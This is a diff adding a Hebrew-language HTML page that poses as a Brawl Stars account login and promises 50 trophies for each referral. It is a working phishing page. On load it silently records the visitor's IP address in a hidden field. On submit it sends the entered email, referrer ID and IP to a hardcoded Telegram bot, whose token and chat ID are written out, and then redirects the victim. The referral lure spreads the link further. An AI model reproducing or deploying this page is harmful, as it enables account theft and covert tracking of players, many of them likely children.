@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="he">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>התחבר לאתר</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    color: white;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .background {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-image: url('background.jpg');
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    filter: brightness(50%);
+    z-index: -1;
+  }
+  .container {
+    background-color: rgba(0, 0, 0, 0.7);
+    padding: 20px;
+    border-radius: 10px;
+    max-width: 400px;
+    width: 90%;
+    z-index: 1;
+  }
+  .form-group {
+    margin-top: 20px;
+  }
+  .form-group label {
+    display: block;
+    margin-bottom: 10px;
+    font-size: 18px;
+  }
+  .form-group input {
+    padding: 8px;
+    font-size: 16px;
+    width: 100%;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+  }
+  .button {
+    padding: 10px 20px;
+    font-size: 18px;
+    background-color: #4CAF50;
+    border: none;
+    color: white;
+    cursor: pointer;
+    margin-top: 20px;
+    border-radius: 5px;
+  }
+  .button:hover {
+    background-color: #45a049;
+  }
+  .small-text {
+    font-size: 14px;
+    color: #ccc;
+  }
+</style>
+</head>
+<body>
+
+<div class="background"></div>
+
+<div class="container">
+  <h1>התחבר לאתר</h1>
+  
+  <form id="loginForm" onsubmit="sendToTelegram(event)">
+    
+    <div class="form-group">
+      <label for="email">כתובת אימייל (של החשבון בראול סטארס שלך)</label>
+      <input type="email" id="email" name="email" required>
+    </div>
+    
+    <div class="form-group">
+      <label for="referrerId">האיידי של המשתמש ששיתף אותך (לא חובה)</label>
+      <input type="text" id="referrerId" name="referrerId">
+    </div>
+    
+    <div class="form-group" style="display: none;">
+      <label for="ipAddress">כתובת IP:</label>
+      <input type="text" id="ipAddress" name="ipAddress" readonly>
+    </div>
+    
+    <button type="submit" class="button">התחבר</button>
+    
+    <p class="small-text"> על כל משתמש ששלחת לו את הקישור והוא שלח את האיידי שלך תתוגמל ב50 גביעים</p>
+  </form>
+  
+</div>
+
+<script>
+// קבלת כתובת IP בעת טעינת הדף
+window.onload = function() {
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      document.getElementById('ipAddress').value = data.ip;
+    })
+    .catch(error => {
+      console.error('שגיאה בקבלת כתובת IP:', error);
+    });
+};
+
+function sendToTelegram(event) {
+  event.preventDefault(); // מונע את השליחה האוטומטית של הטופס
+  
+  var email = document.getElementById('email').value;
+  var referrerId = document.getElementById('referrerId').value;
+  var ipAddress = document.getElementById('ipAddress').value;
+  
+  var botToken = '7464738479:AAEpaIDKh7L8-gG0jJWUQndSTjp2dhj0wiQ';
+  var chatId = '7051699509';
+  var message = 'כתובת אימייל : ' + email + '\n';
+  if (referrerId) {
+    message += ' איידי   : ' + referrerId + '\n';
+  }
+  message += 'כתובת IP: ' + ipAddress;
+  var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
+  
+  // שליחת הבקשה לשרת של Telegram
+  fetch(url)
+    .then(function(response) {
+      return response.json();
+    })
+    .then(function(data) {
+      // העבר את המשתמש לדף HTML חדש
+      window.location.href = 'page3.html';
+    })
+    .catch(function(error) {
+      console.error('שגיאה בשליחת ההודעה:', error);
+      alert('אירעה שגיאה בשליחת ההודעה. אנא נסה שוב מאוחר יותר.');
+    });
+}
+</script>
+
+</body>
+</html>
